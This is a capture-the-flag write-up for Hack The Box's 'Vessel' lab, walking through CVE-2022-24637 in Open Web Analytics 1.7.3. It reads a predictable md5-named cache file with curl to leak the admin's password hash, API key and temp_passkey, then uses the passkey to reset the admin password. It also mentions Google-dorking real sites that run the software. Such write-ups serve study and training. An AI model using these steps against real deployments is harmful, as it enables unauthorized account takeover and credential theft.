1) With some searches online, it is found that openwebanalytics (owa) is vulnerable to a recently discovered vulnerability: [https://www.cvedetails.com/cve/CVE-2022-24637/](https://www.cvedetails.com/cve/CVE-2022-24637/), more detail can be found here: [https://devel0pment.de/?p=2494](https://devel0pment.de/?p=2494)
2) The vulnerable source code can be found here: [https://github.com/Open-Web-Analytics/Open-Web-Analytics/tree/1.7.3](https://github.com/Open-Web-Analytics/Open-Web-Analytics/tree/1.7.3)
3) Inspecting the code in `modules/base/classes/fileCache.php`, basically, a cache file is generated with its corresponding action, the cache file is stored at:
```
$cache_file = $this->makeCollectionDirPath($collection).$id.'.php';
# this corresponds to http://openwebanalytics.vessel.htb/owa-data/caches/1/
# cache_id is 1 by default
```
4) The cache file is generated using the id of the user in the format: `md5(id1)`
5)  So, for the user with an id of 1, the cache name would be: fafe1b60c24107ccd8f4562213e44849
6) Using [http://openwebanalytics.vessel.htb/index.php?owa_do=base.passwordResetForm](http://openwebanalytics.vessel.htb/index.php?owa_do=base.passwordResetForm), we can figure out a valid email, `admin@vessel.htb`
7) I assume this user has an id of 1, and in the end it turns out to be true.
8) We can attempt to login using this account, even a failed login will generate the cache file under: [http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_configuration/](http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_configuration/), yet this cache doesn’t contain any user sensitive info. So we need to find other corresponding actions to generate another caches.
9) With some Google search, i found someone else’s website running owa and revealed how the cache files are named. Then way i searched is using google search operators:
```
inurl: "owa-data/caches"
```
10) Later, i found that by requesting to reset password for the user `admin@vessel.htb`, a cache will be generated at [http://openwebanalytics.vessel.htb/owadata/caches/1/owa_user/fafe1b60c24107ccd8f4562213e44849.php](http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/fafe1b60c24107ccd8f4562213e44849.php), this can be observed because when a cache file is there, the path [http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/](http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/) will display a blank page instead of the directory listing view.
11) Check the content of the file:
12) get the base64 encoded content and then decode it:
```
curl http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/fafe1b60c24107ccd8f4562213e44849.php

O:8:"owa_user":5:{s:4:"name";s:9:"base.user";s:10:"properties";a:10:{s:2:"id";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:1:"1";s:9:"data_type";s:6:"SERIAL";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:7:"user_id";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:5:"admin";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:1;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:8:"password";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:60:"$2y$10$seT74YJuo1hsZgXS4UCYFOMogk95iQzGkCR9YjXoUAOg7w.dwumzO";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:4:"role";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:5:"admin";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:9:"real_name";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:13:"default admin";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:13:"email_address";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:16:"admin@vessel.htb";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:12:"temp_passkey";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:32:"56801c66e2a182724800625776088f0e";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:13:"creation_date";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:10:"1650211659";s:9:"data_type";s:6:"BIGINT";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:16:"last_update_date";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:10:"1650211659";s:9:"data_type";s:6:"BIGINT";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:7:"api_key";O:12:"owa_dbColumn":11:{s:4:"name";s:7:"api_key";s:5:"value";s:32:"a390cc0247ecada9a2b8d2338b9ca6d2";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}}s:16:"_tableProperties";a:4:{s:5:"alias";s:4:"user";s:4:"name";s:8:"owa_user";s:9:"cacheable";b:1;s:23:"cache_expiration_period";i:604800;}s:12:"wasPersisted";b:1;s:5:"cache";N;}
```
13) he password hash can be found from the cache, but it cannot be cracked. However, we can see there is a `temp_passkey`, which can be used with the `base.usersChangePassword` action to change the account’s password:
```
http://openwebanalytics.vessel.htb/index.php?owa_do=base.usersChangePassword
```
14) Inspect the form to check the key name (hidden in the form) used for this request `owa_k`
15) Remove the hidden property, and paste the temp_passkey into the field, then change the password
16) Now, you should be able to login the account `admin` using the newly set password